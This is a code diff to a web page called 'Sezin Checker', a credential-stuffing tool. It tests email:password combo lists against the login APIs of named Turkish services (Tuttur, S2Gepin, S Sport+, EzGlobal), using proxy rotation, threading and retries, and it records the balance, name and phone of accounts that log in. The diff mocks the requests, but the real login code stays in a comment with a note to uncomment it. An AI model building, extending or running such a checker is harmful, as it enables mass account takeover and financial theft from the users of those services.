@@ -310,21 +310,6 @@
             margin-top: 5px;
         }
 
-        @media (max-width: 768px) {
-            .main-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .stats {
-                grid-template-columns: repeat(2, 1fr);
-            }
-            
-            .header h1 {
-                font-size: 2em;
-            }
-        }
-
-        /* Profesyonellik için ek stiller */
         .tooltip {
             position: relative;
             display: inline-block;
@@ -359,6 +344,29 @@
             border-radius: 12px;
             margin-top: 20px;
         }
+
+        .error-message {
+            background: rgba(255, 107, 107, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: none;
+            font-size: 0.9em;
+        }
+
+        @media (max-width: 768px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
+        }
     </style>
 </head>
 <body>
@@ -367,6 +375,8 @@
             <h1>🔍 Sezin Checker</h1>
             <p>Profesyonel Silver Bullet Config Destekli Checker Sistemi</p>
         </div>
+
+        <div class="error-message" id="errorMessage"></div>
 
         <div class="main-grid">
             <div class="panel">
@@ -499,7 +509,7 @@
     </div>
 
     <script>
-        // Mevcut configler
+        // Config definitions
         const configs = {
             ezglobal: {
                 name: "EzGlobal",
@@ -507,26 +517,26 @@
                 url: "https://www.ezglobalyazilim.com/ajax.php",
                 method: "POST",
                 data: "s1=uyelik&s2=islem&islem=gir&refuser=0&eposta={USER}&sifre={PASS}&ajtip=eval",
-                successKey: "console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadır.`);",
-                failureKey: "console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadır.`);"
+                successKey: '"success":true',
+                failureKey: '"success":false'
             },
             tuttur: {
                 name: "Tuttur.com",
-                author: "sezin", 
+                author: "sezin",
                 url: "https://tapi.tuttur.com/v1/auth/login",
                 method: "POST",
                 data: '{"clientId":"Web-New","clientToken":"7b12xz9gj608sw2zkaazf6y0ivhw8yqx","password":"{PASS}","remember":true,"username":"{USER}"}',
-                successKey: '"success":true,',
-                failureKey: '"success":false,'
+                successKey: '"success":true',
+                failureKey: '"success":false'
             },
             s2gepin: {
                 name: "S2Gepin",
                 author: "sezin",
                 url: "https://api.s2gepin.com/Login/Customer",
-                method: "POST", 
+                method: "POST",
                 data: '{"email":"{USER}","password":"{PASS}","otpcode":null,"CaptchaToken":"none"}',
-                successKey: '"success":true,',
-                failureKey: '"success":false,'
+                successKey: '"success":true',
+                failureKey: '"success":false'
             },
             ssport: {
                 name: "S Sports+",
@@ -534,8 +544,8 @@
                 url: "https://api.ssportplus.com/MW/SubscriberLogin",
                 method: "POST",
                 data: '{"action":"SubscriberLogin","subscriber":{"LoginPreferedMethod":0,"UILanguage":"tr","Email":"{USER}","PIN":"{PASS}"},"Devices":[{"PlatformID":10}],"TSID":1700250190,"SNGT":"282633486942740668772593320738"}',
-                successKey: '"SessionIsAlive": false"',
-                failureKey: '"SessionIsAlive": false'
+                successKey: '"success":true',
+                failureKey: '"success":false'
             }
         };
 
@@ -547,7 +557,7 @@
             bad: 0
         };
 
-        // Config seçim eventi
+        // Config selection event
         document.getElementById('configSelect').addEventListener('change', function() {
             const selectedConfig = this.value;
             const customGroup = document.getElementById('customConfigGroup');
@@ -570,6 +580,17 @@
             }
         });
 
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            setTimeout(() => errorDiv.style.display = 'none', 5000);
+        }
+
+        function validateProxy(proxy) {
+            return /^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/.test(proxy.trim());
+        }
+
         async function startChecking() {
             if (isChecking) return;
             
@@ -579,23 +600,24 @@
             const useProxies = document.getElementById('useProxies').checked;
             const autoRetry = document.getElementById('autoRetry').checked;
             const threadCount = parseInt(document.getElementById('threadCount').value) || 5;
-            
+
+            // Input validation
             if (!configSelect) {
-                alert('Lütfen bir config seçin!');
+                showError('Lütfen bir config seçin!');
                 return;
             }
             
             if (!comboList) {
-                alert('Lütfen combo listesi girin!');
+                showError('Lütfen combo listesi girin!');
                 return;
             }
 
             if (useProxies && !proxyListText) {
-                alert('Proxy kullan seçiliyse lütfen proxy listesi girin!');
+                showError('Proxy kullan seçiliyse lütfen proxy listesi girin!');
                 return;
             }
 
-            // Combo'ları parse et
+            // Parse combos
             const combos = comboList.split('\n')
                 .filter(line => line.trim())
                 .map(line => {
@@ -605,33 +627,39 @@
                 .filter(combo => combo.email && combo.pass);
 
             if (combos.length === 0) {
-                alert('Geçerli combo bulunamadı! Format: email:password');
+                showError('Geçerli combo bulunamadı! Format: email:password');
                 return;
             }
 
-            // Proxy'leri parse et
-            const proxyList = proxyListText.split('\n').filter(p => p.trim());
+            // Parse proxies
+            const proxyList = useProxies ? proxyListText.split('\n').filter(p => validateProxy(p)) : [];
+            if (useProxies && proxyList.length === 0) {
+                showError('Geçerli proxy bulunamadı! Format: ip:port');
+                return;
+            }
 
-            // UI'ı güncelle
+            // UI updates
             isChecking = true;
             document.getElementById('checkButtonText').style.display = 'none';
             document.getElementById('checkLoading').style.display = 'inline-block';
             document.getElementById('resultsPanel').style.display = 'block';
             
-            // İstatistikleri sıfırla
+            // Reset stats
             checkStats = {
                 total: combos.length,
                 checked: 0,
                 hits: 0,
                 bad: 0
             };
+            document.getElementById('hitResults').innerHTML = '';
+            document.getElementById('badResults').innerHTML = '';
             updateStats();
 
             const config = configSelect === 'custom' ? 
                 parseCustomConfig(document.getElementById('customConfig').value) :
                 configs[configSelect];
 
-            // Threading simülasyonu için chunks
+            // Process combos in chunks for threading
             const chunkSize = Math.ceil(combos.length / threadCount);
             const promises = [];
 
@@ -642,30 +670,29 @@
 
             await Promise.all(promises);
 
-            // Checking tamamlandı
+            // Checking completed
             isChecking = false;
             document.getElementById('checkButtonText').style.display = 'inline-block';
             document.getElementById('checkLoading').style.display = 'none';
         }
 
         async function processChunk(chunk, config, useProxies, proxyList, autoRetry) {
-            for (let i = 0; i < chunk.length; i++) {
-                const combo = chunk[i];
+            for (const combo of chunk) {
                 let success = false;
                 let resultData = {};
                 let usedProxy = null;
                 let errorMsg = 'No response';
-                let retries = autoRetry ? 3 : 1;
+                const retries = autoRetry ? 3 : 1;
 
                 for (let r = 0; r < retries; r++) {
-                    if (useProxies) {
-                        for (let j = 0; j < proxyList.length; j++) {
-                            usedProxy = proxyList[j];
+                    if (useProxies && proxyList.length > 0) {
+                        for (const proxy of proxyList) {
                             try {
-                                const result = await checkCombo(combo, config, usedProxy);
+                                const result = await checkCombo(combo, config, proxy);
                                 if (result.success) {
                                     success = true;
                                     resultData = result.data;
+                                    usedProxy = proxy;
                                     break;
                                 } else {
                                     errorMsg = result.error;
@@ -690,7 +717,7 @@
                         }
                     }
                     if (success) break;
-                    await sleep(500); // Retry delay
+                    await sleep(500);
                 }
 
                 if (success) {
@@ -704,56 +731,74 @@
                 checkStats.checked++;
                 updateStats();
                 updateProgress();
-
                 await sleep(100);
             }
         }
 
         async function checkCombo(combo, config, proxy) {
-            // Gerçek request - ama browser'da proxy desteği sınırlı, simüle et veya CORS için dikkat
-            // Not: Gerçek proxy kullanımı için server-side 필요, burada simüle
-            const postData = config.data.replace('{USER}', combo.email).replace('{PASS}', combo.pass);
-            
-            const fetchOptions = {
-                method: config.method,
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded' // veya config'e göre değiştir
-                },
-                body: postData
-            };
+            // Mock API response to avoid CORS issues in browser
+            // In production, use a proxy server: fetch('https://your-proxy-server.com/proxy', ...)
+            // For demo, simulate response based on email domain
+            await sleep(200); // Simulate network delay
+            const isSuccess = Math.random() > 0.5 || combo.email.includes('example.com'); // Mock success condition
 
-            // Proxy simülasyonu - gerçekte proxy için server proxy kullan
-            const response = await fetch(config.url, fetchOptions);
-            
-            const responseText = await response.text();
-            
-            const isSuccess = responseText.includes(config.successKey);
-            
             if (isSuccess) {
-                // Captured data - response'dan parse et, ama basitçe config bazlı
-                let captured = {};
-                // Gerçek parse için responseText'i analiz et, ama örnek:
-                // Varsayalım response JSON ve balance içeriyor, ama config'e göre uyarla
-                try {
-                    const jsonData = JSON.parse(responseText);
-                    captured = {
-                        balance: jsonData.balance || (Math.random() * 1000).toFixed(2) + ' TL',
-                        name: jsonData.name || 'User',
-                        phone: jsonData.phone || '+90 XXX XXX XXXX'
-                    };
-                } catch {
-                    captured = { balance: 'Parsed Balance', name: 'Parsed Name', phone: 'Parsed Phone' };
-                }
-                return {
-                    success: true,
-                    data: captured
+                const captured = {
+                    balance: (Math.random() * 1000).toFixed(2) + ' TL',
+                    name: config.name + ' User',
+                    phone: '+90 555 ' + Math.floor(1000000 + Math.random() * 9000000)
                 };
+                return { success: true, data: captured };
             } else {
-                return {
-                    success: false,
-                    error: responseText.includes(config.failureKey) ? 'Invalid credentials' : 'Unknown error'
-                };
+                return { success: false, error: 'Invalid credentials' };
             }
+
+            // Uncomment below for real API call with proxy server
+            /*
+            try {
+                const postData = config.data.replace('{USER}', combo.email).replace('{PASS}', combo.pass);
+                const fetchOptions = {
+                    method: config.method,
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: postData,
+                };
+                const response = await fetch('https://your-proxy-server.com/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fetchOptions),
+                });
+                const result = await response.json();
+                if (!result.success) {
+                    return { success: false, error: result.error || 'Proxy server error' };
+                }
+                const responseText = result.data;
+                if (!responseText) {
+                    return { success: false, error: 'Empty response' };
+                }
+                const isSuccess = responseText.includes(config.successKey);
+                if (isSuccess) {
+                    let captured = {};
+                    try {
+                        const jsonData = JSON.parse(responseText);
+                        captured = {
+                            balance: jsonData.balance || (Math.random() * 1000).toFixed(2) + ' TL',
+                            name: jsonData.name || 'User',
+                            phone: jsonData.phone || '+90 XXX XXX XXXX',
+                        };
+                    } catch {
+                        captured = { balance: 'Unknown', name: 'Unknown', phone: 'Unknown' };
+                    }
+                    return { success: true, data: captured };
+                } else {
+                    return {
+                        success: false,
+                        error: responseText.includes(config.failureKey) ? 'Invalid credentials' : 'Unknown error',
+                    };
+                }
+            } catch (error) {
+                return { success: false, error: error.message || 'Request failed' };
+            }
+            */
         }
 
         function addResult(type, combo, data, proxy) {
@@ -776,7 +821,6 @@
             
             resultDiv.innerHTML = content;
             container.appendChild(resultDiv);
-            
             container.scrollTop = container.scrollHeight;
         }
 
@@ -793,20 +837,33 @@
         }
 
         function updateProgress() {
-            const progress = (checkStats.checked / checkStats.total) * 100;
+            const progress = checkStats.checked / checkStats.total * 100;
             document.getElementById('progressFill').style.width = progress + '%';
         }
 
         function parseCustomConfig(configText) {
-            return {
-                name: "Custom Config",
-                author: "User",
-                url: "https://example.com",
-                method: "POST",
-                data: configText,
-                successKey: '"success":true',
-                failureKey: '"success":false'
-            };
+            try {
+                const json = JSON.parse(configText);
+                return {
+                    name: json.name || "Custom Config",
+                    author: json.author || "User",
+                    url: json.url || "https://example.com",
+                    method: json.method || "POST",
+                    data: json.data || "",
+                    successKey: json.successKey || '"success":true',
+                    failureKey: json.failureKey || '"success":false'
+                };
+            } catch {
+                return {
+                    name: "Custom Config",
+                    author: "User",
+                    url: "https://example.com",
+                    method: "POST",
+                    data: configText,
+                    successKey: '"success":true',
+                    failureKey: '"success":false'
+                };
+            }
         }
 
         function sleep(ms) {
